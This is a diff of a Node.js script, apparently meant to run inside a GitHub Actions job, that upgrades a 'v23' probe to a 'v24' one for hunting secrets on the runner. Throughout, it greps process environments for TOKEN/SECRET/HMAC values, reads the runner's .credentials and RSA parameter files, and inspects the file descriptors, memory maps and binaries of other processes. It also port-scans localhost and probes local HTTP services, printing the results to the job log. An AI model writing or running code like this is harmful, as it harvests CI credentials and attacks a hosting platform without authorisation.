@@ -3,212 +3,257 @@ const fs = require('fs');
 const path = require('path');
 const { execSync } = require('child_process');
 
-// v23: Runner filesystem + process inspection
-// Goal: find HMAC key material, credentials, or other secrets in runner FS/procs
-
-const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
-const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
-const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
-const RUNNER_TEMP = process.env.RUNNER_TEMP || '';
-const RUNNER_TOOL_CACHE = process.env.RUNNER_TOOL_CACHE || '';
-const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
-const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID || '';
-const GITHUB_WORKSPACE = process.env.GITHUB_WORKSPACE || '';
+// v24: Deep runner process inspection
+// v23 found: Runner.Worker PID 2115, Runner.Listener PID 2096, hosted-compute-agent PID 2063
+// All running as `runner` user — can we access their FDs, maps, and net connections?
+// Also: read event.json, runner config files at correct path, runner file commands
+// And: ACTIONS_RUNNER_RETURN_JOB_RESULT_FOR_HOSTED=1 endpoint
 
 function run(cmd) {
-  try { return execSync(cmd, { encoding: 'utf8', timeout: 5000 }).trim(); }
-  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 100).trim(); }
+  try { return execSync(cmd, { encoding: 'utf8', timeout: 8000 }).trim(); }
+  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 120).trim(); }
 }
 
 function readSafe(p, maxBytes) {
   try {
     const content = fs.readFileSync(p);
-    const len = content.length;
-    if (len === 0) return '(empty)';
-    const str = content.toString('utf8').substring(0, maxBytes || 500);
-    return str + (len > (maxBytes || 500) ? '...(len=' + len + ')' : '');
-  } catch(e) {
-    return 'ERR: ' + e.message;
-  }
-}
-
-function findFiles(dir, depth) {
-  if (depth <= 0) return [];
-  let results = [];
-  try {
-    const entries = fs.readdirSync(dir, { withFileTypes: true });
-    for (const e of entries) {
-      const fp = path.join(dir, e.name);
-      if (e.isFile()) results.push(fp);
-      else if (e.isDirectory() && !e.name.startsWith('.git')) {
-        results = results.concat(findFiles(fp, depth - 1));
-      }
-    }
-  } catch(e) {}
-  return results;
+    if (content.length === 0) return '(empty)';
+    return content.toString('utf8').substring(0, maxBytes || 500) + (content.length > (maxBytes || 500) ? '...(len=' + content.length + ')' : '');
+  } catch(e) { return 'ERR: ' + e.message; }
 }
 
 async function main() {
-  console.log('=== V23: Runner filesystem + process inspection ===');
-  console.log('RUNNER_TEMP:', RUNNER_TEMP, '| WORKSPACE:', GITHUB_WORKSPACE);
-  console.log('Run:', GITHUB_RUN_ID, '| Repo:', GITHUB_REPOSITORY);
+  console.log('=== V24: Deep runner process + filesystem inspection ===');
+  const RUNNER_TEMP = process.env.RUNNER_TEMP || '/home/runner/work/_temp';
+  const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
+  const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
+  const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
 
-  // === PART 1: Runner process inspection ===
-  console.log('\n=== PART 1: Runner processes (parent processes) ===');
-  console.log('[PS] All runner-related processes:');
-  console.log(run('ps aux | grep -E "runner|actions|dotnet" | grep -v grep | head -20'));
+  // Get actual PIDs from ps — don't trust pgrep
+  const psOut = run('ps -eo pid,ppid,cmd --no-headers');
+  const lines = psOut.split('\n');
+  let workerPid = null, listenerPid = null, hcaPid = null, bashPid = process.ppid;
+  for (const l of lines) {
+    const m = l.trim().match(/^(\d+)\s+\d+\s+(.+)/);
+    if (!m) continue;
+    const pid = m[1]; const cmd = m[2];
+    if (cmd.includes('Runner.Worker')) workerPid = pid;
+    if (cmd.includes('Runner.Listener')) listenerPid = pid;
+    if (cmd.includes('hosted-compute-agent')) hcaPid = pid;
+  }
+  console.log('Runner.Worker PID:', workerPid);
+  console.log('Runner.Listener PID:', listenerPid);
+  console.log('hosted-compute-agent PID:', hcaPid);
+  console.log('bash parent PID:', bashPid);
 
-  // Find the runner daemon PID
-  console.log('\n[PS] Runner binary:');
-  console.log(run('which Runner.Worker Runner.Listener dotnet 2>/dev/null || true'));
-  console.log(run('find /home/runner/runners /opt/runner /usr/local/bin -name "Runner.Worker" -o -name "Runner.Listener" 2>/dev/null | head -5'));
+  // === PART 1: Network connections (what are the runner processes connected to?) ===
+  console.log('\n=== PART 1: Network connections ===');
+  // ss shows all sockets with owning process
+  console.log('[SS] TCP connections (all processes):');
+  console.log(run('ss -tuanp 2>/dev/null | head -30'));
+  // Also get the remote IP of the runner service connection
+  console.log('[SS] TCP ESTABLISHED:');
+  console.log(run('ss -tuanp 2>/dev/null | grep ESTAB | head -20'));
 
-  // === PART 2: Check process environment of parent processes ===
-  console.log('\n=== PART 2: Parent process environment ===');
-  const ppid = process.ppid;
-  const pppid = parseInt(run('cat /proc/' + ppid + '/status | grep PPid | awk \'{print $2}\'') || 0);
-  console.log('[PROC] My PID:', process.pid, '| PPID:', ppid, '| PPPID:', pppid);
-
-  // Try to read parent env
-  const parentEnvPath = '/proc/' + ppid + '/environ';
-  const parentEnv = run('cat ' + parentEnvPath + ' 2>/dev/null | tr "\\0" "\\n" | grep -E "HMAC|SECRET|TOKEN|KEY|CRED|AUTH|RUNNER_SECRET|ACTIONS_HMAC|SHARED|SIGNING" | head -20');
-  if (parentEnv && !parentEnv.startsWith('ERR:')) {
-    console.log('[PARENT_ENV] Interesting vars in parent process:');
-    console.log(parentEnv);
-  } else {
-    console.log('[PARENT_ENV] Cannot read parent env:', parentEnv);
+  // Look at Runner.Worker's network connections via /proc
+  if (workerPid) {
+    console.log('\n[NET] Runner.Worker TCP connections:');
+    // /proc/PID/net/tcp shows TCP connections for this process's network namespace
+    const tcpHex = run('cat /proc/' + workerPid + '/net/tcp 2>/dev/null | head -20');
+    console.log(tcpHex);
+    console.log('[NET] Runner.Worker network via ss filter:');
+    console.log(run('ss -tuanp 2>/dev/null | grep "pid=' + workerPid + '"'));
   }
 
-  // Try grandparent (the runner daemon)
-  const gpEnvPath = '/proc/' + pppid + '/environ';
-  const gpEnv = run('cat ' + gpEnvPath + ' 2>/dev/null | tr "\\0" "\\n" | grep -E "HMAC|SECRET|TOKEN|KEY|CRED|AUTH|SIGNING|SHARED" | head -20');
-  if (gpEnv && !gpEnv.startsWith('ERR:')) {
-    console.log('[GP_ENV] Interesting vars in grandparent process:');
-    console.log(gpEnv);
-  } else {
-    console.log('[GP_ENV]:', gpEnv.substring(0, 100));
+  // === PART 2: File descriptors of runner processes ===
+  console.log('\n=== PART 2: Runner process file descriptors ===');
+  for (const [name, pid] of [['Runner.Worker', workerPid], ['Runner.Listener', listenerPid], ['HCA', hcaPid]]) {
+    if (!pid) { console.log('[FD] ' + name + ': PID not found'); continue; }
+    const fds = run('ls -la /proc/' + pid + '/fd 2>/dev/null | head -30');
+    if (!fds.startsWith('ERR:')) {
+      console.log('[FD] ' + name + ' (PID ' + pid + ') open files:');
+      console.log(fds);
+    } else {
+      console.log('[FD] ' + name + ' (PID ' + pid + '): NOT READABLE (' + fds + ')');
+    }
   }
 
-  // Full env of parent to find runner-specific vars
-  const parentFullEnv = run('cat /proc/' + ppid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -v "^$" | head -50');
-  if (parentFullEnv && !parentFullEnv.startsWith('ERR:')) {
-    console.log('[PARENT_FULL_ENV] All parent env vars:');
-    console.log(parentFullEnv);
+  // === PART 3: Memory maps of runner processes (look for credential files) ===
+  console.log('\n=== PART 3: Memory maps (credential files) ===');
+  for (const [name, pid] of [['Runner.Worker', workerPid], ['Runner.Listener', listenerPid]]) {
+    if (!pid) continue;
+    const maps = run('grep -E "json|cred|token|secret|key|hmac|sign|\.runner|config" /proc/' + pid + '/maps 2>/dev/null | head -20');
+    if (!maps.startsWith('ERR:') && maps.length > 0) {
+      console.log('[MAPS] ' + name + ' (PID ' + pid + ') interesting mapped files:');
+      console.log(maps);
+    } else {
+      console.log('[MAPS] ' + name + ': no interesting maps / not readable');
+    }
   }
 
-  // === PART 3: Runner configuration files ===
-  console.log('\n=== PART 3: Runner configuration files ===');
+  // === PART 4: Runner installation directory ===
+  console.log('\n=== PART 4: Runner installation directory ===');
+  const runnerBase = '/home/runner/actions-runner';
+  console.log('[DIR] /home/runner/actions-runner/:');
+  console.log(run('ls -la ' + runnerBase + ' 2>/dev/null'));
+  console.log('[DIR] /home/runner/actions-runner/cached/:');
+  console.log(run('ls -la ' + runnerBase + '/cached/ 2>/dev/null'));
+  console.log('[DIR] /home/runner/actions-runner/cached/2.335.1/:');
+  console.log(run('ls -la ' + runnerBase + '/cached/2.335.1/ 2>/dev/null | head -20'));
 
-  // Runner configuration is usually at ~/.runner or the runner install dir
-  const runnerConfigPaths = [
-    '/home/runner/.runner',
-    '/home/runner/work/_temp/.runner',
-    '/home/runner/runners/.runner',
-    '/etc/actions-runner/.runner',
-    RUNNER_TEMP + '/.runner',
-    // The runner also writes a .credentials file
-    '/home/runner/.credentials',
-    '/home/runner/.credentials_rsaparams',
-    '/home/runner/work/.credentials',
-    RUNNER_TEMP + '/.credentials',
+  // Read runner config files from the correct location
+  const runnerConfigs = [
+    runnerBase + '/.runner',
+    runnerBase + '/cached/2.335.1/.runner',
+    runnerBase + '/.credentials',
+    runnerBase + '/cached/2.335.1/.credentials',
+    runnerBase + '/.credentials_rsaparams',
+    '/opt/hca/.runner',
+    '/opt/hca/.credentials',
+    runnerBase + '/cached/2.335.1/bin/.runner',
   ];
-  for (const p of runnerConfigPaths) {
-    const content = readSafe(p, 300);
+  for (const p of runnerConfigs) {
+    const content = readSafe(p, 500);
     if (!content.startsWith('ERR:')) {
-      console.log('[CONFIG] ' + p + ':');
+      console.log('[RUNNER_CONFIG] ' + p + ':');
       console.log(content);
     }
   }
 
-  // === PART 4: Temp directory inspection ===
-  console.log('\n=== PART 4: Temp directory contents ===');
-  console.log('[TEMP] $RUNNER_TEMP contents:');
-  console.log(run('ls -la ' + RUNNER_TEMP + ' 2>/dev/null | head -30'));
-  console.log('[TEMP] Files in RUNNER_TEMP:');
-  console.log(run('find ' + RUNNER_TEMP + ' -maxdepth 3 -type f 2>/dev/null | head -40'));
+  // Also look for .json config files in the runner directory
+  console.log('[FIND] Config files in runner dir:');
+  console.log(run('find ' + runnerBase + ' -maxdepth 3 -name "*.json" -o -name ".runner" -o -name ".credentials" -o -name "*.key" 2>/dev/null | head -20'));
 
-  // Look for credential/token files in temp
-  console.log('[TEMP] Token/credential files:');
-  console.log(run('find ' + RUNNER_TEMP + ' -maxdepth 5 -type f | xargs grep -l "token\\|secret\\|hmac\\|key\\|credential\\|bearer" 2>/dev/null | head -10'));
-
-  // === PART 5: Look for runner message file (contains job secrets) ===
-  console.log('\n=== PART 5: Runner message/job context files ===');
-  // The runner receives a "job message" from the broker that contains secrets
-  // This might be temporarily stored on disk
-  const sensitiveFiles = run('find /home/runner /tmp /var/tmp -maxdepth 6 -type f \\( -name "*.json" -o -name "*.token" -o -name "*.key" -o -name "*.credentials" -o -name "context.json" -o -name "job.json" \\) 2>/dev/null | head -30');
-  console.log('[SENSITIVE] JSON/token/key files:');
-  console.log(sensitiveFiles);
-
-  // Read any interesting found files
-  if (sensitiveFiles && !sensitiveFiles.startsWith('ERR:')) {
-    for (const fp of sensitiveFiles.split('\n').filter(Boolean).slice(0, 5)) {
-      console.log('[FILE] ' + fp + ':');
-      console.log(readSafe(fp, 200));
+  // === PART 5: hosted-compute-agent inspection ===
+  console.log('\n=== PART 5: hosted-compute-agent inspection ===');
+  console.log('[HCA] /opt/hca/:');
+  console.log(run('ls -la /opt/hca/ 2>/dev/null'));
+  console.log('[HCA] Files in /opt/hca/:');
+  console.log(run('find /opt/hca -maxdepth 3 -type f 2>/dev/null | head -20'));
+  // Read any config files
+  const hcaConfigs = run('find /opt/hca -maxdepth 3 -name "*.json" -o -name "*.yaml" -o -name "*.conf" -o -name "*.env" 2>/dev/null | head -10');
+  if (hcaConfigs && !hcaConfigs.startsWith('ERR:')) {
+    for (const fp of hcaConfigs.split('\n').filter(Boolean).slice(0, 5)) {
+      console.log('[HCA_CONFIG] ' + fp + ':');
+      console.log(readSafe(fp, 400));
+    }
+  }
+  // HCA env
+  if (hcaPid) {
+    const hcaEnv = run('cat /proc/' + hcaPid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -v "^$" | head -30');
+    if (!hcaEnv.startsWith('ERR:') && hcaEnv.length > 0) {
+      console.log('[HCA_ENV] hosted-compute-agent environment:');
+      console.log(hcaEnv);
+    } else {
+      console.log('[HCA_ENV] NOT READABLE:', hcaEnv.substring(0, 100));
     }
   }
 
-  // === PART 6: Check /proc for the runner's open file descriptors ===
-  console.log('\n=== PART 6: Runner process file descriptors ===');
-  // The runner process might have an open fd to the secret store
-  const procs = run('pgrep -f "Runner.Worker\\|runner.worker" 2>/dev/null | head -3');
-  console.log('[PROCS] Runner.Worker PIDs:', procs);
-  if (procs && !procs.startsWith('ERR:')) {
-    for (const pid of procs.split('\n').filter(Boolean).slice(0, 2)) {
-      const fds = run('ls -la /proc/' + pid + '/fd 2>/dev/null | head -20');
-      console.log('[FD] PID ' + pid + ' open files:');
-      console.log(fds);
-      // Try to read the maps to find memory-mapped credential files
-      const maps = run('grep -E "json|token|cred|secret" /proc/' + pid + '/maps 2>/dev/null | head -10');
-      if (maps && !maps.startsWith('ERR:')) {
-        console.log('[MAPS] PID ' + pid + ' interesting mappings:', maps);
+  // === PART 6: Read workflow event.json and file commands ===
+  console.log('\n=== PART 6: Workflow context files ===');
+  const eventJson = RUNNER_TEMP + '/_github_workflow/event.json';
+  console.log('[EVENT] event.json:');
+  console.log(readSafe(eventJson, 1000));
+
+  // Read runner file commands
+  const fileCommands = [
+    RUNNER_TEMP + '/_runner_file_commands',
+  ];
+  console.log('[FILE_CMDS] _runner_file_commands/:');
+  console.log(run('ls -la ' + RUNNER_TEMP + '/_runner_file_commands/ 2>/dev/null'));
+  const fcFiles = run('find ' + RUNNER_TEMP + '/_runner_file_commands -type f 2>/dev/null');
+  if (fcFiles && !fcFiles.startsWith('ERR:')) {
+    for (const fp of fcFiles.split('\n').filter(Boolean)) {
+      console.log('[FC] ' + fp + ':');
+      console.log(readSafe(fp, 500));
+    }
+  }
+
+  // Read the bash script wrapper
+  const shFile = RUNNER_TEMP + '/' + run('ls ' + RUNNER_TEMP + ' | grep ".sh$" 2>/dev/null | head -1');
+  if (shFile && !shFile.includes('ERR:')) {
+    console.log('[BASH_SCRIPT] ' + shFile + ':');
+    console.log(readSafe(shFile, 200));
+  }
+
+  // === PART 7: ACTIONS_RUNNER_RETURN_JOB_RESULT_FOR_HOSTED investigation ===
+  console.log('\n=== PART 7: ACTIONS_RUNNER_RETURN_JOB_RESULT_FOR_HOSTED=1 endpoint ===');
+  // Find what URL the runner uses to return job results
+  // The runner posts back job results to a "job result" endpoint
+  // Check for this in the runner binary strings
+  console.log('[STRINGS] Job result URLs in runner binary:');
+  console.log(run('strings /home/runner/actions-runner/cached/2.335.1/bin/Runner.Worker 2>/dev/null | grep -iE "job.result|return.result|complete|finish" | head -20'));
+  console.log('[STRINGS] ResultForHosted URLs:');
+  console.log(run('strings /home/runner/actions-runner/cached/2.335.1/bin/Runner.Worker 2>/dev/null | grep -iE "hosted|JobResult|ReturnJob" | head -10'));
+  // Also search Runner.Listener
+  console.log('[STRINGS] Broker/finish URLs in Runner.Listener:');
+  console.log(run('strings /home/runner/actions-runner/cached/2.335.1/bin/Runner.Listener 2>/dev/null | grep -iE "broker|finish|complete|result|hosted" | head -20'));
+
+  // === PART 8: What does Runner.Worker communicate with? ===
+  // The Runner.Worker spawnclient uses args "142 145" — these look like file descriptor numbers
+  console.log('\n=== PART 8: Runner.Worker spawnclient FD args ===');
+  // The args "142 145" to spawnclient are likely the file descriptor numbers for the pipe
+  // connecting Runner.Worker to Runner.Listener
+  // Let's check what FD 142 and 145 are in the Runner.Worker process
+  if (workerPid) {
+    for (const fd of ['142', '145', '0', '1', '2', '3', '4', '5']) {
+      const fdLink = run('readlink /proc/' + workerPid + '/fd/' + fd + ' 2>/dev/null');
+      if (!fdLink.startsWith('ERR:') && fdLink.length > 0) {
+        console.log('[WORKER_FD] fd[' + fd + '] → ' + fdLink);
       }
     }
   }
 
-  // === PART 7: Check job orchestration context ===
-  console.log('\n=== PART 7: Orchestration context files ===');
-  const orchPaths = [
-    GITHUB_WORKSPACE + '/../_temp',
-    GITHUB_WORKSPACE + '/../../_temp',
-    '/home/runner/work/_temp',
-    '/home/runner/work/_actions',
-  ];
-  for (const dir of orchPaths) {
-    const listing = run('ls -la ' + dir + ' 2>/dev/null | head -20');
-    if (!listing.startsWith('ERR:') && listing.length > 0) {
-      console.log('[ORCH] ' + dir + ':');
-      console.log(listing);
-    }
+  // === PART 9: Cgroup and systemd service info ===
+  console.log('\n=== PART 9: System context ===');
+  console.log('[CGROUP] hosted-compute-agent cgroup:');
+  console.log(run('cat /sys/fs/cgroup/system.slice/hosted-compute-agent.service/memory.pressure 2>/dev/null | head -3'));
+  // List cgroup tasks (processes in HCA service)
+  console.log('[CGROUP_TASKS] HCA service processes:');
+  console.log(run('cat /sys/fs/cgroup/system.slice/hosted-compute-agent.service/cgroup.procs 2>/dev/null | head -20'));
+  // General system info
+  console.log('[SYS] /proc/version:');
+  console.log(run('cat /proc/version 2>/dev/null'));
+  // Check if we're in a container or VM
+  console.log('[SYS] Container detection:');
+  console.log(run('cat /proc/1/cgroup 2>/dev/null | head -5'));
+
+  // === PART 10: Probe hosted-compute-agent for HTTP endpoints ===
+  console.log('\n=== PART 10: HCA local HTTP endpoint probe ===');
+  // hosted-compute-agent likely runs a local HTTP service for communication
+  const { execSync: execSync2 } = require('child_process');
+  // Find what ports hosted-compute-agent is listening on
+  console.log('[HCA_PORTS] HCA listening ports:');
+  console.log(run('ss -tuanlp 2>/dev/null | grep "pid=' + hcaPid + '"'));
+  // Try common local ports
+  const net = require('net');
+  const checkPort = (port) => new Promise((r) => {
+    const s = new net.Socket();
+    s.setTimeout(200);
+    s.on('connect', () => { s.destroy(); r(true); });
+    s.on('timeout', () => { s.destroy(); r(false); });
+    s.on('error', () => r(false));
+    s.connect(port, '127.0.0.1');
+  });
+  const openPorts = [];
+  for (const port of [80, 443, 8080, 8081, 8082, 9090, 9091, 2376, 2377, 5985, 8000, 8443, 50051, 7777, 9099, 9100]) {
+    if (await checkPort(port)) openPorts.push(port);
   }
+  console.log('[HCA_PORTS] Open localhost ports:', openPorts.join(', ') || 'none');
 
-  // === PART 8: Memory scan for HMAC key patterns ===
-  console.log('\n=== PART 8: Accessible memory / proc patterns ===');
-  // Look for any file in /proc/*/mem that contains "hmac" or "signing"
-  // (usually not readable without elevated perms, but worth checking)
-  const ourPid = process.pid;
-  const smaps = run('grep -E "heap|stack" /proc/' + ourPid + '/smaps 2>/dev/null | head -5');
-  console.log('[SMAPS] Our process memory layout:', smaps.substring(0, 200));
-
-  // Check if we can read other processes' environments
-  const allPids = run('ls /proc | grep -E "^[0-9]+$" | head -20');
-  let accessibleEnvs = [];
-  for (const pid of allPids.split('\n').filter(Boolean)) {
-    const env = run('cat /proc/' + pid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -c "." 2>/dev/null');
-    if (env && !env.startsWith('ERR:') && parseInt(env) > 0) {
-      accessibleEnvs.push(pid);
-    }
-  }
-  console.log('[PROC_ACCESS] PIDs with readable env:', accessibleEnvs.join(', '));
-
-  // For each accessible env, look for secrets
-  for (const pid of accessibleEnvs.slice(0, 10)) {
-    const env = run('cat /proc/' + pid + '/environ 2>/dev/null | tr "\\0" "\\n" | grep -E "HMAC|SIGNING|SECRET_KEY|RUNNER_TOKEN|RUNNER_SECRET" | head -5');
-    if (env && !env.startsWith('ERR:') && env.trim().length > 0) {
-      console.log('[SECRET_ENV] PID ' + pid + ':', env);
-    }
+  // Try HTTP on any open ports
+  for (const port of openPorts.slice(0, 3)) {
+    const r = await new Promise((resolve) => {
+      const req = require('http').request({ hostname: '127.0.0.1', port, path: '/', method: 'GET' },
+        (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 200) })); });
+      req.on('error', e => resolve({ status: 'ERR', body: e.message }));
+      req.setTimeout(1000, () => { req.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
+      req.end();
+    });
+    console.log('[HCA_HTTP] port ' + port + ':', r.status, '|', r.body.substring(0, 100));
   }
 
   console.log('\nDone.');
 }
 
-main().catch(e => console.log('Fatal:', e.message));
+main().catch(e => console.log('Fatal:', e.message, e.stack));
